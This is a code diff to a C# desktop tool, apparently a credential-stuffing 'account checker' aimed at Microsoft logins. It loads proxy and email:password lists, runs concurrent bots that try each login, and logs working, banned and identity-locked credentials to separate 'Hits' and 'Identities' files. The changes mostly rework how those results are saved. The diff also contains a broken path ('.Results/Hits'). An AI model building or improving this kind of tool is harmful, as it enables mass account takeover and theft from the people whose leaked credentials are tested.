@@ -25,8 +25,13 @@ namespace AccountCheckerWPF
         private int _ban = 0;
         private int _identity = 0;
         private int _unknown = 0;
+
         private readonly ProxyManager _proxyManager;
         private readonly AccountManager _accountManager;
+
+        private StreamWriter _hitFileWriter;
+        private StreamWriter _keyCheckStatusFileWriter;
+        private StreamWriter _identityFileWriter;
 
         private readonly IHttpServices _httpServices;
 
@@ -74,6 +79,8 @@ namespace AccountCheckerWPF
 
         private async void CheckAccountBtn_Click(object sender, RoutedEventArgs e)
         {
+            #region Check input
+
             if (string.IsNullOrWhiteSpace(SelectProxyFileTxt.Text))
             {
                 MessageBox.Show("Please select a proxy file first.");
@@ -92,45 +99,68 @@ namespace AccountCheckerWPF
                 return;
             }
 
+            MessageBox.Show("Account checking is starting. Please wait...");
+
             var selectedProxyType = (ProxyTypeEnums)ProxyTypeComboBox.SelectedItem;
             try
             {
-                var proxyCount = _proxyManager.LoadProxiesFromFile(SelectProxyFileTxt.Text, selectedProxyType);
-                Console.WriteLine($"Loaded {proxyCount} proxies");
+                _proxyManager.LoadProxiesFromFile(SelectProxyFileTxt.Text, selectedProxyType);
             }
             catch (Exception ex)
             {
-                Console.WriteLine("Please ensure proxy file exists!");
+                MessageBox.Show("Please ensure proxy file exists!");
                 return;
             }
 
             try
             {
-                var accountCount = _accountManager.LoadFromFile(SelectAccountFileTxt.Text);
-                Console.WriteLine($"Loaded {accountCount} accounts");
+                _accountManager.LoadFromFile(SelectAccountFileTxt.Text);
             }
             catch (Exception ex)
             {
-                Console.WriteLine("Please ensure account file exists!");
+                MessageBox.Show("Please ensure account file exists!");
                 return;
             }
 
+            #endregion
+
             _httpServices.InitHttpClient();
 
-            var hitsDirectory = "./Hits";
+            var resultDirectory = "./Results";
+            if (!Directory.Exists(resultDirectory))
+            {
+                Directory.CreateDirectory(resultDirectory);
+            }
+
+            var hitsDirectory = ".Results/Hits";
             if (!Directory.Exists(hitsDirectory))
             {
                 Directory.CreateDirectory(hitsDirectory);
-                Console.WriteLine("Hits directory created.");
-            }
-            else
-            {
-                Console.WriteLine("Hits directory loaded.");
             }
 
             var hitFilePath = Path.Combine(hitsDirectory, DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss") + ".txt");
+            _hitFileWriter = new StreamWriter(hitFilePath, false);
 
-            await using var hitFileWriter = new StreamWriter(hitFilePath, false);
+            var keyCheckStatusDirectory = ".Results/KeyCheckStatus";
+            if (!Directory.Exists(keyCheckStatusDirectory))
+            {
+                Directory.CreateDirectory(keyCheckStatusDirectory);
+            }
+
+            var keyCheckStatusFilePath = Path.Combine(keyCheckStatusDirectory,
+                DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss") + ".txt");
+            _keyCheckStatusFileWriter = new StreamWriter(keyCheckStatusFilePath, false);
+
+            var identityDirectory = ".Results/Identities";
+            if (!Directory.Exists(identityDirectory))
+            {
+                Directory.CreateDirectory(identityDirectory);
+            }
+
+            var identityFilePath =
+                Path.Combine(identityDirectory, DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss") + ".txt");
+            _identityFileWriter = new StreamWriter(identityFilePath, false);
+
             var botCount = int.Parse(NumberOfBots.Text);
             _semaphore = new SemaphoreSlim(botCount, botCount);
 
@@ -149,7 +179,8 @@ namespace AccountCheckerWPF
 
             await Task.WhenAll(tasks);
 
-            Console.WriteLine("Done checking!");
+            MessageBox.Show("Done checking!");
+            await CommonHelper.CloseStreamWritersAsync(_hitFileWriter, _keyCheckStatusFileWriter, _identityFileWriter);
         }
 
         private async Task WorkerFunc()
@@ -217,10 +248,12 @@ namespace AccountCheckerWPF
             {
                 case LoginKeyCheckStatus.Fail:
                     _fail++;
+                    await _keyCheckStatusFileWriter.WriteLineAsync($"{email}:{password} - Fail");
                     return RetryStatus.Done;
 
                 case LoginKeyCheckStatus.Ban:
                     _ban++;
+                    await _keyCheckStatusFileWriter.WriteLineAsync($"{email}:{password} - Ban");
                     return RetryStatus.Done;
 
                 case LoginKeyCheckStatus.Retry:
@@ -229,25 +262,22 @@ namespace AccountCheckerWPF
 
                 case LoginKeyCheckStatus.Success:
                     _success++;
-                    await HandleSuccessResponse(postResponse, cookies);
+                    await _hitFileWriter.WriteLineAsync($"{email}:{password} - Success");
+                    await HandleLoginSuccessResponse(postResponse, cookies);
                     return RetryStatus.Done;
 
                 case LoginKeyCheckStatus.Identity:
                     _identity++;
-                    await CommonHelper.WriteToIdentityFile(email, password);
+                    await _hitFileWriter.WriteLineAsync($"{email}:{password} - Identity");
+                    await _identityFileWriter.WriteLineAsync($"{email}:{password}");
                     return RetryStatus.Done;
-
-                case LoginKeyCheckStatus.Unknown:
-                    _unknown++;
-                    _retry++;
-                    return RetryStatus.Retry;
 
                 default:
                     return RetryStatus.Done;
             }
         }
 
-        private async Task HandleSuccessResponse(HttpResponseMessage postResponse, List<string> cookies)
+        private async Task HandleLoginSuccessResponse(HttpResponseMessage postResponse, List<string> cookies)
         {
             var cid = CommonHelper.GetCookieValue("MSPCID", cookies)?.ToUpper();
 
